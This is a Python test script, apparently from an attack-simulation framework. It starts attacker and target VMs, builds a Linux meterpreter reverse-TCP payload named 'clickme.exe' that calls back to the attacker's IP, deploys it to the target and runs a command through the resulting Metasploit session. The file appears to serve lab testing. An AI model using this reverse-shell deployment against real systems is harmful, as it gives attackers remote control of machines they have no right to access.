#!/usr/bin/env python3
""" Command line tool to interact with metasploit running on the attack server """

from app.machinecontrol import Machine
from app.attack_log import AttackLog
from app.metasploit import MSFVenom, Metasploit


# For some local tests
if __name__ == "__main__":

    # msfrpcd -S -P PASSWORD -u USER -f
    # attacker_ip = "192.168.178.125"
    # target_ip = "192.168.178.125"

    # Metasploit RPC
    PASSWORD = "PASSWORD"
    USER = "USER"

    attack_logger = AttackLog(2)
    attacker = Machine({  # "root": "systems/attacker1",
                       "os": "linux",
                       "vm_controller": {
                           "type": "vagrant",
                           "vagrantfilepath": "systems",
                           # "ip": attacker_ip
                       },
                       "vm_name": "attacker",
                       "machinepath": "attacker1"}, attack_logger)
    attacker.up()

    # Target machine is attacker machine here
    target = Machine({  # "root": "systems/target3",
                     "os": "linux",
                     "vm_controller": {
                        "type": "vagrant",
                        "vagrantfilepath": "systems",
                        #  "ip": attacker_ip
                     },
                     "vm_name": "target3",
                     "machinepath": "target3"}, attack_logger)
    target.up()

    venom = MSFVenom(attacker, target, attack_logger)
    PAYLOAD_TYPE = "linux/x64/meterpreter_reverse_tcp"
    print(venom.generate_payload(payload=PAYLOAD_TYPE,
                                 architecture="x64",
                                 platform="linux",
                                 # lhost,
                                 format="elf",
                                 outfile="clickme.exe"))
    venom.generate_and_deploy(payload=PAYLOAD_TYPE,
                              architecture="x64",
                              platform="linux",
                              lhost=attacker.get_ip(),
                              format="elf",
                              outfile="clickme.exe")
    # start msfrpcd on attacker
    # TODO get meterpreter session
    # TODO simple command to test

    metasploit = Metasploit(PASSWORD, attacker=attacker, username=USER)
    metasploit.start_exploit_stub_for_external_payload(payload=PAYLOAD_TYPE)
    print(metasploit.meterpreter_execute(["getuid"], 0))
    # client = MsfRpcClient('yourpassword', ssl=True)

    target.halt()
    attacker.halt()
